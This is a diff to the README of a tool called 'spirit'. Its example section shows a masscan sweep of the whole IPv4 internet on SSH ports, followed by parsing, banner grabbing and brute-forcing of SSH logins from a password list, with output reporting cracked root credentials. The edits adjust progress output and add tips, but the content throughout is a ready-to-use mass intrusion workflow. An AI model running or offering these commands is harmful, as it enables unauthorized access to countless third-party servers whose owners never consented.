@@ -23,6 +23,7 @@ And more... check out the helpfile [`$ ./spirit --help`](./HELP)
 
 ## Example usage
 ```bash
+# make sure your masscan command uses -oG open.lst for the results output file
 $ masscan --rate="50000" --ports "22,222,2222,2212" 0.0.0.0/0 --exclude 255.255.255.255 -oG open.lst
 Scanning 4294967295 hosts [4 ports/host]
 
@@ -30,7 +31,7 @@ $ ./spirit parse open.lst
 INFO created h.lst in HOST:PORT format
 
 $ ./spirit banner
-SSH-2.0-OpenSSH_8.2p  13% [=>                  ] (3686/26803) [11s:1m15s]
+SSH-2.0-OpenSSH_8.2p  13% [=>                  ] [11s:1m15s]
 INFO created b.lst in HOST:PORT:BANNER format
 
 $ mv b.lst h.lst
@@ -38,10 +39,10 @@ $ mv b.lst h.lst
 $ ./spirit brute
 INFO loaded h.lst with 26803 hosts
 INFO loaded p.lst with 4881 logins
-root:!1qwerty 192.168.0.1:22 found [77] blocked [33] 20% [====>            ] [1m30s:13m36s]
+[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
+$ less -S found.lst
 
 Tip: you can automate these steps with ./spirit auto
-Tip: you can run ./spirit forever to run masscan on random ports and automatically brute
 ```
 
 ## Download the latest Spirit release
